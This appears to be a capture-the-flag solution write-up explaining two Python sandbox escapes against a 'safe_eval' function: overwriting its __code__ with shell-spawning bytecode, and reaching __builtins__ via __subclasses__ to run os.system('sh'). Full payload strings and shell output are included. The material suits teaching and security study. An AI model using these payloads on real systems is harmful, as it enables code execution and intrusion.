# Solution

There are a few ways to solve this problem, each described within the sections below.

## Overwriting `__code__`

An interesting solution to this problem is to overwrite the Python bytecode of the `safe_eval` function. Because this function is within the local scope, it's possible for us set arbitrary attributes on it. It turns out that Python function VM bytecode is stored as an object on the function itself, in the `__code__` attribute. So, we just need a reference to a `__code__` constructor and some shell-popping bytecode to solve this challenge. The constructor can be retrieved by pulling it from a `lambda` (among other techniques):

```python
>>> (lambda: 1).__code__.__class__()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: code() takes at least 14 arguments (0 given)
```

But how do we know the arguments that this type expects? It turns out that `__code__` objects are instances of the `CodeType` class, whose arguments are documented in the [`inspect` module](https://docs.python.org/3/library/inspect.html) page. We can get a shell-popping bytecode by pulling it off of an existing functon, as is done in [`gen-bytcode.py`](./gen-bytecode.py).

So, we can use the following commands to overwrite the bytecode of the `safe_eval` function and call it once more to pop a shell:

```
> safe_eval __code__ "(lambda: 1).__code__.__class__(1,0,0,2,3,67,b'd\x01d\x00l\x00}\x01|\x01\xa0\x01d\x02\xa1\x01\x01\x00d\x00S\x00',(None, 0, 'sh'),('os', 'system'),('x', 'os'),'gen-bytecode.py','shell',7,b'\x00\x01\x08\x01',(),())"
TOKEN: (lambda: 1).__code__.__class__(1,0,0,2,3,67,b'd\x01d\x00l\x00}\x01|\x01\xa0\x01d\x02\xa1\x01\x01\x00d\x00S\x00',(None, 0, 'sh'),('os', 'system'),('x', 'os'),'gen-bytecode.py','shell',7,b'\x00\x01\x08\x01',(),())
VALUE: <code object shell at 0x000001CC59F2FD40, file "gen-bytecode.py", line 7>
[DEBUG]: Setting <function main.<locals>.safe_eval at 0x000001CC59F323A0>.__code__ to <code object shell at 0x000001CC59F2FD40, file "gen-bytecode.py", line 7>
> safe_eval 0 0
$
```

## Recovering `builtins`

It is also possible to recover a reference to [`builtins`](https://docs.python.org/3/library/builtins.html), via several methods. The easiest way to determine these paths is via a an attribute and item traversal of descendants of `object`. This technique is explained in [this awesome blog post](https://nedbatchelder.com/blog/201302/finding_python_3_builtins.html). I have provided a slightly updated version of this script in the [`find-builtins.py`](./find-builtins.py) file in this repository.

Looking at the output from this script, let's pick one reference to `builtins` to build around:

```python
re.Scanner.__init__.__globals__['__builtins__']
```

The [`re`](https://docs.python.org/3/library/re.html) module will not be imported into the scope where the `eval` occurs in the target program, so we have to find another way of getting a reference to the `Scanner` class. Fortunately, we can do so by enumerating all subclasses of `object`.

Because Python provides a [`__subclasses__`](https://stackoverflow.com/questions/3862310/how-to-find-all-the-subclasses-of-a-class-given-its-name) method on all subclasses of `object` (which is the case for all classes in Python 3), we can enumerate all subclasses of `object` until we find `Scanner`. But, without `builtins` in scope, we also don't have a reference to `object`. This can be solved by getting a reference to `object` with something like `().__class__.__base__`. This is easiest done in a comprehension:

```python
>>> [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Scanner'][0]
<class 're.Scanner'>
```

Using this as our reference to `re.Scanner`, we can build a full payload of the form:

```python
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Scanner'][0].__init__.__globals__['__builtins__']
```

With a reference to `builtins`, we can chain it with `__import__('os').system('sh')` to spawn a shell:

```python
>>> [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Scanner'][0].__init__.__globals__['__builtins__']['__import__']('os').system('sh')`
$
```

So, for our target application, a shell-popping command we can send is:

```sh
safe_eval 0 "[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Scanner'][0].__init__.__globals__['__builtins__']['__import__']('os').system('sh')"
```